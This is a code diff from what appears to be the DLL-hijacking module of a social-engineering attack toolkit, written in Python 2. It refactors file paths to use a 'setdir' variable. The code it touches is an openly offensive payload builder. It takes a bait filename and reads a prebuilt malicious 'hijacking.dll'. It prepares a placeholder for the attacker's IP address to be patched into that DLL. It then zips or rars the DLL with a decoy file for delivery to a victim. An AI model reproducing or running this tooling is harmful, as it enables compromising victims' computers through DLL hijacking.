@@ -59,12 +59,12 @@ for line in fileopen:
 print "\n   [*] You have selected the file extension of %s and vulnerable dll of %s" % (extension,dll)
 
 # prep the directories
-subprocess.Popen("mkdir src/program_junk/dll", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+subprocess.Popen("mkdir " + setdir + "/dll", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 filename1=raw_input(setprompt(["2","15"], "Enter the filename for the attack (example:openthis) [openthis]"))
 if filename1 == "": filename1 = "openthis"
 
 # move the files there using the correct extension and file type
-filewrite=file("src/program_junk/dll/%s%s" % (filename1,extension),"w")
+filewrite=file(setdir + "/dll/%s%s" % (filename1,extension),"w")
 filewrite.write("EMPTY")
 filewrite.close()
 
@@ -78,7 +78,7 @@ else:
 fileopen=open("src/webattack/dll_hijacking/hijacking.dll" , "rb")
 data=fileopen.read()
 
-filewrite=open("src/program_junk/dll/%s" % (dll), "wb")
+filewrite=open(setdir + "/dll/%s" % (dll), "wb")
 
 host=int(len(ipaddr)+1) * "X"
 
@@ -121,7 +121,7 @@ if choice == "1":
     match=re.search("Add files to archive", stdout_value)
     # we get a hit?
     if match:
-        subprocess.Popen("cd src/program_junk/dll;rar a %s/src/program_junk/template.rar * 1> /dev/null 2> /dev/null" % (definepath), shell=True).wait()
+        subprocess.Popen("cd %s/dll;rar a %s/template.rar * 1> /dev/null 2> /dev/null" % (setdir,setdir), shell=True).wait()
         counter=1
 
     # if we didnt find rar
@@ -133,7 +133,7 @@ if choice == "1":
 # if its a zipfile zip the badboy up
 if choice == "2":
     # write to a zipfile here
-    file = zipfile.ZipFile("src/program_junk/template.zip", "w")
-    for name in glob.glob("src/program_junk/dll/*"):
+    file = zipfile.ZipFile(setdir + "/template.zip", "w")
+    for name in glob.glob(setdir + "/dll/*"):
         file.write(name, os.path.basename(name), zipfile.ZIP_DEFLATED)
     file.close()
